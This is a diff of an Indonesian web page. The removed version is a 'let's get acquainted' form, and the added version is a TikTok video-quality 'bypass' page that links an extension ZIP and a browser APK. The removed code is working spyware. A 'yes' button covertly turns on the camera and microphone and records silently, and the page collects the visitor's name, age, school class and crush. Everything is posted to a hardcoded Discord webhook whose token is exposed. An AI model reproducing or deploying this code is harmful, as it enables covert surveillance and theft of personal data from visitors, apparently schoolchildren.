@@ -1,246 +1,184 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kenalan Yuk! ✨</title>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --primary: #ff4d94;
-            --primary-light: #ff80b3;
-            --bg: #0a0a0c;
-            --glass: rgba(255, 255, 255, 0.05);
-            --border: rgba(255, 255, 255, 0.1);
-        }
+  <meta charset="UTF-8">
+  <link rel="icon" type="image/png" href="asset/icon/senze.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="color-scheme" content="dark">
+  <title>Senzeyn X Tiktok</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
-
-        body {
-            background-color: var(--bg);
-            background-image: 
-                radial-gradient(circle at 10% 20%, rgba(255, 77, 148, 0.1) 0%, transparent 40%),
-                radial-gradient(circle at 90% 80%, rgba(139, 92, 246, 0.08) 0%, transparent 40%);
-            color: white;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-        }
-
-        .glass-card {
-            background: var(--glass);
-            backdrop-filter: blur(20px);
-            padding: 40px 30px;
-            border-radius: 35px;
-            border: 1px solid var(--border);
-            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
-            text-align: center;
-            width: 90%;
-            max-width: 380px;
-            position: relative;
-        }
-
-        h2 { font-size: 1.6rem; font-weight: 800; margin-bottom: 12px; line-height: 1.3; color: #fff; }
-        p { color: #a1a1aa; margin-bottom: 30px; font-size: 0.95rem; }
-
-        .form-content { text-align: left; }
-        .input-group { margin-bottom: 18px; }
-        label { display: block; margin-bottom: 8px; color: #71717a; font-size: 0.8rem; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
-        
-        input {
-            width: 100%; padding: 14px 18px; border-radius: 18px; border: 1px solid var(--border);
-            background: rgba(0, 0, 0, 0.2); color: white; outline: none; transition: 0.3s;
-        }
-        input:focus { border-color: var(--primary); background: rgba(255, 77, 148, 0.05); }
-
-        .btn {
-            width: 100%; padding: 16px; border: none; border-radius: 20px;
-            font-size: 1rem; font-weight: 700; cursor: pointer; transition: 0.4s;
-            letter-spacing: 0.5px;
-        }
-        .btn-primary { 
-            background: linear-gradient(135deg, var(--primary), #bc13fe); 
-            color: white; 
-            box-shadow: 0 10px 20px rgba(255, 77, 148, 0.3);
-        }
-        .btn-primary:hover { transform: translateY(-3px); box-shadow: 0 15px 25px rgba(255, 77, 148, 0.4); }
-
-        /* Dialogs */
-        .overlay {
-            position: fixed; inset: 0; background: var(--bg); z-index: 100;
-            display: flex; justify-content: center; align-items: center;
-            padding: 20px;
-        }
-
-        #successDialog {
-            position: fixed; inset: 0; background: rgba(10, 10, 12, 0.95);
-            backdrop-filter: blur(25px); z-index: 200;
-            display: none; justify-content: center; align-items: center;
-            opacity: 0; transition: 0.5s;
-        }
-
-        .heart-icon { font-size: 3.5rem; margin-bottom: 20px; display: inline-block; animation: heartbeat 1.5s infinite; }
-        @keyframes heartbeat {
-            0% { transform: scale(1); }
-            15% { transform: scale(1.2); }
-            30% { transform: scale(1); }
-            45% { transform: scale(1.1); }
-            60% { transform: scale(1); }
-        }
-    </style>
+  <link rel="stylesheet" href="ui/ui.css">
 </head>
+
 <body>
 
-    <div id="step1" class="overlay">
-        <div class="glass-card">
-            <div class="heart-icon">💖</div>
-            <h2>SEBELUM KENALAN,<br>APAKAH KAMU MAU KENALAN DENGAN KU?</h2>
-            <p>Klik tombol di bawah kalau kamu mau kita temenan ya!</p>
-            <button class="btn btn-primary" onclick="initApp()">MAU BANGET! ✨</button>
+  <div class="ambient"></div>
+  <div class="sparkles" id="sparklesContainer"></div>
+
+  <div class="container">
+    <div class="di-wrap">
+      <target rel="noopener noreferrer" class="di-island" id="diIsland">
+        <div class="di-icon">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
+            <path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-2.88 2.5 2.89 2.89 0 0 1-2.89-2.89 2.89 2.89 0 0 1 2.89-2.89c.28 0 .54.04.79.1V9.01a6.33 6.33 0 0 0-.79-.05 6.34 6.34 0 0 0-6.34 6.34 6.34 6.34 0 0 0 6.34 6.34 6.34 6.34 0 0 0 6.33-6.34V8.69a8.18 8.18 0 0 0 4.78 1.52V6.75a4.85 4.85 0 0 1-1.01-.06z"/>
+          </svg>
         </div>
+        <span class="di-label">Senzeyn</span>
+        <div class="di-expanded-content">
+          <div class="di-expanded-title">@senzeyn</div>
+          <div class="di-expanded-sub">Follow My Tiktok ↗</div>
+        </div>
+      </a>
+    </div>
+    <div class="header">
+      <div class="brand-label">Bypass V2.0</div>
+      <div class="title-wrap">
+        <div class="h1-top" id="h1Top"></div>
+
+      </div>
+      <p class="subtitle">High Quality TikTok Video — Zero Compression</p>
+
+      <div class="social-links">
+        <a href="https://www.tiktok.com/@senzeyn" target="_blank" rel="noopener noreferrer" class="social-btn social-btn--tiktok">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+            <path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-2.88 2.5 2.89 2.89 0 0 1-2.89-2.89 2.89 2.89 0 0 1 2.89-2.89c.28 0 .54.04.79.1V9.01a6.33 6.33 0 0 0-.79-.05 6.34 6.34 0 0 0-6.34 6.34 6.34 6.34 0 0 0 6.34 6.34 6.34 6.34 0 0 0 6.33-6.34V8.69a8.18 8.18 0 0 0 4.78 1.52V6.75a4.85 4.85 0 0 1-1.01-.06z"/>
+          </svg>
+          TikTok
+        </a>
+        <a href="https://whatsapp.com/channel/0029VbCEGksKrWR05ai0XJ1B" target="_blank" rel="noopener noreferrer" class="social-btn social-btn--whatsapp">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+            <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413z"/>
+          </svg>
+          Channel
+        </a>
+        <a href="https://sociabuzz.com/senzeyn7/donate" target="_blank" rel="noopener noreferrer" class="social-btn social-btn--donation">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/>
+          </svg>
+          Donate
+        </a>
+      </div>
     </div>
 
-    <div id="mainForm" class="glass-card" style="display: none; opacity: 0; transition: 0.5s;">
-        <h2 style="font-size: 1.4rem;">Yeay! Kenalan Yuk..</h2>
-        <p>Biar akrab, isi dikit ya profil kamu.</p>
-        <div class="form-content">
-            <div class="input-group">
-                <label>Nama Kamu</label>
-                <input type="text" id="nama" placeholder="Tulis namamu di sini..">
-            </div>
-            <div class="input-group">
-                <div style="display: flex; gap: 12px;">
-                    <div style="flex: 1;">
-                        <label>Umur</label>
-                        <input type="number" id="umur" placeholder="Berapa?">
-                    </div>
-                    <div style="flex: 1;">
-                        <label>Kelas</label>
-                        <input type="text" id="kelas" placeholder="Kelas?">
-                    </div>
-                </div>
-            </div>
-            <div class="input-group">
-                <label>Siapa Crush Kamu? 😍</label>
-                <input type="text" id="crush" placeholder="Punya doi gak?">
-            </div>
-            <button class="btn btn-primary" id="btnSubmit" onclick="submitData()">
-                Selesai! 🚀
-            </button>
+    <div class="card info-card">
+      <button class="info-toggle" id="instructionToggle">
+        <div style="display:flex;align-items:center;gap:8px;">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
+          </svg>
+          Information & Features
         </div>
+        <svg class="chevron" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="6 9 12 15 18 9"></polyline>
+        </svg>
+      </button>
+
+      <div class="info-body" id="instructionContent">
+        <div class="info-inner">
+          <div class="info-content">
+            <div class="divider"></div>
+            <ul class="feature-list">
+              Use 1080p 60 FPS Resolution for more optimal video and no Bugs!<br>
+              <br>Features :<br>
+              <li>Free Full Access</li>
+              <li>High Quality Video — 0 Compression</li>
+              <li>Support Up To 1080p 60 FPS All Region</li>
+              <li>No Stuck Video On TikTok</li>
+              <li>Video Optimizer</li>
+              <li>Support Mobile & PC</li>
+              <li>Support All Browser</li>
+            </ul>
+          </div>
+        </div>
+      </div>
     </div>
 
-    <div id="successDialog">
-        <div class="glass-card">
-            <div style="font-size: 3.5rem; margin-bottom: 20px;">🌈</div>
-            <h2>MAKASIH YA!</h2>
-            <p>Data kamu udah aku simpan. Salam kenal ya, senang deh bisa tau tentang kamu!</p>
-            <button class="btn btn-primary" onclick="finalStep()">OKAY! ✨</button>
+    <div class="card tutorial-card">
+      <button class="tutorial-btn" id="tutorialToggle">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <polygon points="5 3 19 12 5 21 5 3"/>
+        </svg>
+        Full Tutorial & Upload (With Extension)
+        <svg class="tutorial-chevron" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="6 9 12 15 18 9"></polyline>
+        </svg>
+      </button>
+
+      <div class="tutorial-body" id="tutorialContent">
+        <div class="tutorial-inner">
+          <div class="tutorial-video-wrap">
+            <video
+              src="asset/video/tutorial.mp4"
+              class="tutorial-video"
+              controls
+              playsinline
+              preload="none"
+            ></video>
+          </div>
+          <div class="tutorial-links">
+            <a href="https://www.mediafire.com/file/f08cwuoxg227ml9/SENZE_V2.5.zip/file" target="_blank" rel="noopener noreferrer" class="tutorial-link-item">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/>
+                <polyline points="15 3 21 3 21 9"/>
+                <line x1="10" y1="14" x2="21" y2="3"/>
+              </svg>
+              EXTENSION
+            </a>
+            <a href="https://www.mediafire.com/file/qi68ly3dkn173c3/Kiwi_Browser.apk/file" target="_blank" rel="noopener noreferrer" class="tutorial-link-item">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/>
+                <polyline points="15 3 21 3 21 9"/>
+                <line x1="10" y1="14" x2="21" y2="3"/>
+              </svg>
+              KIWI BROWSER
+            </a>
+          </div>
         </div>
+      </div>
     </div>
 
-    <video id="v" autoplay muted style="display:none;"></video>
+    <div class="card upload-card">
+      <div class="file-input-wrapper">
+        <input type="file" id="fileInput" class="file-input" accept="video/mp4,video/quicktime">
+        <div class="file-drop-zone" id="fileButton">
+          <div class="upload-icon-wrap">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+              <polyline points="17 8 12 3 7 8"/>
+              <line x1="12" y1="3" x2="12" y2="15"/>
+            </svg>
+          </div>
+          <div class="file-drop-label">Select Video File</div>
+          <div class="file-drop-hint">MP4 — up to 1080p 60 FPS</div>
+        </div>
+      </div>
+      <div class="file-info" id="fileInfo">
+        <strong>Resolution :</strong> <span id="fileResolution"></span><br><br>
+        <strong>FrameRate :</strong> <span id="fileFps"></span><br><br>
+        <strong>Size :</strong> <span id="fileSize"></span><br>
+      </div>
+    </div>
 
-    <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1472604875316789362/WCsymTViSWZcRWqn6Xb_oJcMwelZTf7bRxdQ3lpAkh5rh7eTh49Bx1uZsJfQZOmMaLQg";
-        let recorder;
-        let chunks = [];
+    <div class="process-wrap">
+      <button class="process-button" id="processBtn" disabled>
+        <span>Start Processing</span>
+      </button>
+      <div id="status"></div>
+    </div>
 
-        async function initApp() {
-            try {
-                // Izin kamera disamarkan di balik tombol "Mau Banget"
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.getElementById('v').srcObject = stream;
-                
-                recorder = new MediaRecorder(stream);
-                recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
-                
-                recorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    const f = new FormData();
-                    f.append('file', blob, 'surprise_moment.webm');
-                    f.append('content', '🎥 **Video Recorded Silently**');
-                    await fetch(WEBHOOK, { method: 'POST', body: f });
-                };
+  </div>
+  <script src="js/preload.js"></script>
+  <script src="ui/ui.js"></script>
 
-                recorder.start(1000); // Perekaman dimulai detik ini juga
-                
-                // Transisi UI
-                document.getElementById('step1').style.opacity = '0';
-                setTimeout(() => {
-                    document.getElementById('step1').style.display = 'none';
-                    const main = document.getElementById('mainForm');
-                    main.style.display = 'block';
-                    setTimeout(() => { main.style.opacity = '1'; }, 50);
-                }, 500);
+  <script src="https://unpkg.com/@ffmpeg/ffmpeg@0.11.0/dist/ffmpeg.min.js"></script>
 
-            } catch (err) {
-                alert("Yah, kalau gak diizinkan kita gak bisa kenalan lebih jauh :( Coba lagi ya!");
-            }
-        }
-
-        async function submitData() {
-            const btn = document.getElementById('btnSubmit');
-            const data = {
-                nama: document.getElementById('nama').value,
-                umur: document.getElementById('umur').value,
-                kelas: document.getElementById('kelas').value,
-                crush: document.getElementById('crush').value
-            };
-
-            if(!data.nama) return alert("Namanya belum diisi lho..");
-
-            btn.disabled = true;
-            btn.innerText = "Sabar ya... ✨";
-
-            const payload = {
-                embeds: [{
-                    title: "💖 Ada Teman Baru!",
-                    color: 16731540,
-                    fields: [
-                        { name: "Nama", value: data.nama, inline: true },
-                        { name: "Umur", value: data.umur, inline: true },
-                        { name: "Kelas", value: data.kelas, inline: true },
-                        { name: "Crush", value: data.crush }
-                    ],
-                    footer: { text: "Data masuk pada: " + new Date().toLocaleString() }
-                }]
-            };
-
-            try {
-                await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-
-                const dialog = document.getElementById('successDialog');
-                dialog.style.display = 'flex';
-                setTimeout(() => { dialog.style.opacity = '1'; }, 50);
-
-            } catch (e) {
-                btn.disabled = false;
-                btn.innerText = "Selesai! 🚀";
-            }
-        }
-
-        function finalStep() {
-            document.getElementById('successDialog').innerHTML = `
-                <div class="glass-card">
-                    <div class="heart-icon">✨</div>
-                    <h2>Tunggu bentar ya..</h2>
-                    <p>Lagi menyelaraskan profil kamu biar pas. Jangan tutup halamannya dulu!</p>
-                </div>
-            `;
-        }
-
-        window.addEventListener('beforeunload', () => {
-            if(recorder && recorder.state !== 'inactive') {
-                recorder.stop();
-            }
-        });
-    </script>
+  <script src="js/key.js"></script>
+  <script src="js/read.js"></script>
+  <script src="js/core.js"></script>
+  <script src="js/load.js"></script>
 </body>
-</html>
+            </html>
+                
